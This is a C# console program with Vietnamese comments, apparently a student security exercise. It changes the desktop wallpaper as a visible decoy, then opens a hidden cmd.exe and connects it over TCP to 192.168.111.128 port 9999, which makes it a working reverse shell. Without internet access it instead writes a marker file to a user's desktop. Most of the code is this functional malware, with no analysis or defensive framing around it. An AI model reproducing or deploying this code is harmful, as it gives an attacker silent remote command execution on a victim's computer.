using System;
using System.Net;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;
using System.IO;

namespace ConsoleApp1
{
    class Program
    {
        static void Main(string[] args)
        {
            if (checkinternet()) //kiểm tra có internet hay không
            {
                var desktop = "win10wallpaper.jpg";// tạo 1 biến lưu ảnh.
                new WebClient().DownloadFile("https://ben.com.vn/tin-tuc/wp-content/uploads/2020/03/abstract-nature-1920x1080-8k-21456-1024x576.jpg", desktop);// tải hình ảnh xuống 
                string path = AppDomain.CurrentDomain.BaseDirectory;//lấy đường dẫn thư mục của file vừa tải xuống
                Console.WriteLine(path);
                DisplayPicture(path + desktop);// gọi hàm thay đổi hình nền
                Thread.Sleep(1000);
                File.Delete(path + desktop);// xóa hình ảnh vừa tải
                Console.WriteLine("done");
                reverse();
            }
            else
            {
                writef();
            }
        }
        private static void writef()
        {
            Console.WriteLine("ahiii");
            string directoryPath = @"C:\Users\leoshin\Desktop\18520191";     // 1. Đường dẫn tới thư mục cần tạo New Directory          
            DirectoryInfo directory = new DirectoryInfo(directoryPath); // 2.Khai báo một thể hiện của lớp DirectoryInfo                                                                     
            directory.Create();                                        // 3.Sử dụng phương thức Create để tạo thư mục.
            directoryPath = directoryPath  +@"\nodelete.txt";
            if (!File.Exists(directoryPath)   )                        // 4. kiểm tra coi đường dẫn đến tệp tin đã tổn tại chưa           
            {
              
                using (StreamWriter sw = File.CreateText(directoryPath))   // nếu chưa thì tạo và nghi vào
                {
                    sw.WriteLine("18520191");
                }
            }
            else
            {
                using (StreamWriter sw = File.AppendText(directoryPath)) // còn rồi thì sẽ ghi thêm dữ liệu vào cuối file
                {
                    sw.WriteLine("18520191");
                }
            }

        }
        private static bool checkinternet() //hàm kiểm tra có internet hay không nếu có trả về true còn không trả về false
        {
            try
            {
                System.Net.IPHostEntry i = System.Net.Dns.GetHostEntry("www.google.com");
                return true;
            }
            catch
            {
                return false;
            }
        }
        //----------------------------------------------------------
        // hàm thay đổi ảnh nền
        [DllImport("user32.dll", SetLastError = true)]
        private static extern int SystemParametersInfo(uint uiAction, uint uiParam, string pvParam, uint fWinIni);
        const uint SPI_SETDESKWALLPAPER = 0x14;
        const uint SPIF_UPDATEINIFILE = 0x01;
        public static void SetDesktopWallpaper(string path)
        {
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE);
        }
        //--------------------------------------------------------------
        private static void DisplayPicture(string s)
        {
            SetDesktopWallpaper(s);
        }

        static StreamWriter streamWriter;
        private static void reverse()
        {
            using (TcpClient Client = new TcpClient("192.168.111.128", 9999))
            {
                using (Stream Stream = Client.GetStream())
                {
                    using (StreamReader rdr = new StreamReader(Stream))
                    {
                        streamWriter = new StreamWriter(Stream);

                        StringBuilder strInput = new StringBuilder();

                        Process process = new Process();
                        process.StartInfo.FileName = "cmd.exe";
                        process.StartInfo.CreateNoWindow = true;
                        process.StartInfo.UseShellExecute = false;
                        process.StartInfo.RedirectStandardOutput = true;
                        process.StartInfo.RedirectStandardInput = true;
                        process.StartInfo.RedirectStandardError = true;
                        process.OutputDataReceived += new DataReceivedEventHandler(CMD_Output_Data_Handler);
                        process.Start();
                        process.BeginOutputReadLine();

                        while (true)
                        {
                            strInput.Append(rdr.ReadLine());
                            process.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                }
            }
        }
        private static void CMD_Output_Data_Handler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }
    }
}
